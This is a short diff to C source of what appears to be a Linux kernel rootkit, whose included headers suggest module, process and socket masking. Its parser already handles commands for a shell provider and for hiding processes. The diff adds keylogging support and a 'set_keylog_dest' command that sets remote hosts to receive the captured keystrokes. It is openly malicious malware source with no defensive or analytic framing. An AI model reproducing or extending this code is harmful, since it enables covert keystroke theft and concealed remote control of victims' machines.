@@ -29,7 +29,8 @@
 #include "module_masking.h"		/* Needed for ... */
 #include "process_masking.h"	/* Needed for ... */
 #include "socket_masking.h"		/* Needed for ... */
-
+#include "core.h"
+#include "network_keylogging.h"
 
 /*******************************************************************************/
 /*                                                                             */
@@ -169,6 +170,15 @@ static int parse_json(char *json_str)
 
 				send_sig_info(36, &info, shell_provider_task);
 			}
+
+			} else if (!jsoneq(json_str, &t[i], "set_keylog_dest")) {
+			count = extract_array_values(json_str);
+			printk(KERN_INFO "%s: %d\n", "keylogging_dest", count);
+			for (j=0 ; j<count ; j++) {
+				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
+				set_remote_dest(values[j]);
+			}
+
 
 		} else if (!jsoneq(json_str, &t[i], "hide_processes")) {
 			count = extract_array_values(json_str);
